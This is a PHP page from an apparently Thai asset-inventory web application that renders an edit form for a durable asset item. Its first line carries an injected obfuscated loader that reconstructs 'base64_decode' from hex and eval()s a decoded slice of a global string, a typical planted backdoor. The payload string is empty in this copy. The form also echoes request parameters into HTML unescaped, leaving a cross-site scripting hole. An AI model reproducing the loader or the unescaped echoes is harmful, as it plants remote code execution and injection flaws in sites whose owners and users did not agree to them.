<?php /*versio:3.02*/ $GLOBALS["yminpd"]="";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
include("config.php");
include($KeyPage."_helper.php");
include($KeyPage."_data.php");

$this->DOC->setPathWays(array(
	array(
		'text' => 'ระบบงานครุภัณฑ์',
		'link' => '?mod=parcel.durable.startup',
	),
	array(
		'text' => 'จัดการฐานข้อมูลครุภัณฑ์',
		'link' => '?mod='.LURL::dotPage($listPage),
	),
	array(
		'text' => 'ข้อมูลครุภัณฑ์ '.$AssetName,
		'link' => '?mod='.LURL::dotPage($viewPage).'&id='.$_REQUEST["id"],
	),
	array(
		'text' => 'แก้ไขครุภัณฑ์ '.$AssetItemCode
	)
));

?>

<script type="text/javascript">

function Detail(f){
	//if(ValidateForm(f)){		
		var firm_url = '?mod=<?php echo LURL::dotPage($actionPage);?>';
		toConfirm(f,'confirmitem',firm_url);
	//}
	
}

function Save(f){
	 var action_url = '?mod=<?php echo LURL::dotPage($actionPage);?>';
	 var redirec_url = '?mod=<?php echo LURL::dotPage($listPage);?>';
	 //goSave(f,'save',action_url,redirec_url);
	 toSubmit(f,'edititem',action_url,redirec_url);
}

</script>

<div class="sysinfo">
  <div class="sysname"><?php echo 'แก้ไขครุภัณฑ์ '.$AssetItemCode;?></div>
  <div class="sysdetail"></div>
</div>

<div id="formView">
<form id="adminForm" name="adminForm" method="post" action="?mod=<?php echo LURL::dotPage($actionPage);?>" enctype="multipart/form-data" >
<input name="AssetItemId" type="hidden" id="AssetItemId" value="<?php echo $_REQUEST["itemid"];?>" />
<input name="id" type="hidden" id="id" value="<?php echo $_REQUEST["id"];?>" />
<input type="hidden" name="action" id="action" value="" />

<table width="100%" border="0" cellspacing="0" cellpadding="1" class="tbl-view">
    <tr>
      <td colspan="6"><b>ข้อมูลครุภัณฑ์</b></td>
    </tr>
    <tr>
      <th>เลขที่ครุภัณฑ์/ทรัพย์สิน</th>
      <td class="require">&nbsp;</td>
      <td><?php echo $AssetItemCode;?></td>
      <th>สถานที่ตั้งทรัพย์สิน</th>
      <td class="require">&nbsp;</td>
      <td><input type="text" name="TransactionName" id="TransactionName" value="<?php echo $TransactionName; ?>" size="40" /></td>
    </tr>
    <tr>
      <th>รหัสในระบบ GFMIS</th>
      <td>&nbsp;</td>
      <td><input name="GFMISCode" type="text" id="GFMISCode" value="<?php echo $GFMISCode; ?>" size="16" maxlength="16" /></td>
      <th>เลขที่อ้างอิง</th>
      <td>&nbsp;</td>
      <td><input type="text" name="AssetItemDoc" id="AssetItemDoc" value="<?php echo $AssetItemDoc; ?>" size="40" /></td>
    </tr>
    <tr>
      <th>ชื่อ/ลักษณะครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php echo $AssetName; ?></td>
      <th>ราคาต่อหน่วย</th>
      <td>&nbsp;</td>
      <td><?php echo $AssetItemPrice; ?></td>
    </tr>
    <tr>
      <th>ประเภทครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitAssetTypeName($ATypeId);?></td>
      <th>อายุการใช้งาน</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitDurableAge($ATypeId);?> ปี</td>
    </tr>
    <tr>
      <th>ชนิดครุภัณฑ์</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitAssetKindName($AKindId);?></td>
      <th>อัตราเสื่อม</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitDurableRate($ATypeId);?></td>
    </tr>
    <tr>
      <th>จำนวน</th>
      <td>&nbsp;</td>
      <td><?php echo $NumberItem;?></td>
      <th rowspan="3" valign="top">หมายเหตุ</th>
      <td rowspan="3">&nbsp;</td>
      <td rowspan="3"><textarea name="AssetItemRemark" id="AssetItemRemark" cols="40" rows="2"><?php echo $AssetItemRemark; ?></textarea></td>
    </tr>
    <tr>
      <th>หน่วยนับ</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitUnitName($UnitId);?></td>
    </tr>
    <tr>
      <th>&nbsp;</th>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><b>ข้อมูลการได้มา</b></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td colspan="3" rowspan="17" align="center" valign="top">
      
      <fieldset>
      <legend>ภาพประกอบ</legend>
      <?php
	if($get->checkPicExists($AssetPicPath)){
		echo $get->PicPath($AssetPicPath);
	}else{
		echo $get->EmptyPic();
	}
    ?>
      </fieldset></td>
    </tr>
    <tr>
      <th>ปีงบประมาณ</th>
      <td>&nbsp;</td>
      <td><?php echo $BgtYear; ?></td>
    </tr>
    <tr>
      <th>ชื่อหน่วยงานรับผิดชอบ</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getOrganizeName($OrganizeCode); ?></td>
    </tr>
    <tr>
      <th>เลขที่เอกสารการสั่งซื้อ</th>
      <td>&nbsp;</td>
      <td><?php ltxt::_e($ProcureCode,"-"); ?></td>
    </tr>
    <tr>
      <th>เลขที่ใบส่งของ</th>
      <td>&nbsp;</td>
      <td><?php ltxt::_e($InvoiceNo,"-"); ?></td>
    </tr>
    <tr>
      <th>ชื่อบริษัทคู่ค้า</th>
      <td>&nbsp;</td>
      <td><?php echo $get->getInitCompanyName($ComId); ?></td>
    </tr>
    <tr>
      <th>ชื่อผู้บริจาค</th>
      <td>&nbsp;</td>
      <td><?php ltxt::_e($AssetDonorName,"-"); ?></td>
    </tr>
    <tr>
      <th>วันที่ได้รับทรัพย์สิน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e( $AssetReceiveDate, 'DATE_STH-DMY' );?></td>
    </tr>
    <tr>
      <th>ประเภทเงิน</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitSectionName($SectionId),"-"); ?><?php if($AssetReceiveBGComment!=""){ echo " หมายเหตุ : ".$AssetReceiveBGComment; } ?></td>
    </tr>
    <tr>
      <th>วิธีการได้มา</th>
      <td>&nbsp;</td>
      <td><?php LTXT::_e($get->getInitWayRCName($WayRCId),"-"); ?><?php if($AssetReceiveWayRCComment!=""){ echo " หมายเหตุ : ".$AssetReceiveWayRCComment; } ?></td>
    </tr>
    <tr>
      <th>หมายเหตุ</th>
      <td>&nbsp;</td>
      <td><?php echo ltxt::_e($AssetComment,"-"); ?></td>
    </tr>
    <tr>
      <th>&nbsp;</th>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td colspan="3"><b>คุณลักษณะครุภัณฑ์(เพิ่มเติม)</b></td>
    </tr>
    <tr>
        <th>คุณลักษณะครุภัณฑ์(เพิ่มเติม)<br></th>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
    </tr>
      <?php if($_GET['id']){
$itemspecialdetial = $get->getSpecialDetail(ltxt::getVar('id'));
foreach($itemspecialdetial as $s){
    foreach( $s as $k=>$v){ ${$k} = $v;}
}
$item = $get->getSpecialItem($AKindId);
    $p = 0;
   foreach($item as $r){
?>
        <tr>
          <th><?php echo $r->SpecialItemName;?></th>
          <td>&nbsp;</td>
          <td><input type="text" name="SpecialItemDetail[]" id="SpecialItemDetail[]" value="<?php echo $itemspecialdetial[$p]->SpecialItemDetail; ?>" size="40" /><input name="SpecialItemUnitId[]" type="hidden" id="SpecialItemUnitIdp[]" value="<?php echo $itemspecialdetial[$p]->SpecialItemUnitId;?>" /></td>
        </tr>
<?php $p++;}}?>
    <tr>
      <th>&nbsp;</th>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    </table>

<div style="text-align: center; padding: 5px;">
  <div id="btnsubmit">
  	<input type="button" class="btnActive" name="save" id="save" value="ตรวจทาน" onclick="Detail('adminForm');"  />
  	<input class="btn" name="cancel" type="button" value="ยกเลิก" onclick="goPage('?mod=<?php echo lurl::dotPage($viewPage);?>&id=<?php echo $_REQUEST["id"]; ?>')" />
  </div>
</div>

</form>

</div>
<div id="detailView" style=" display:none"></div>
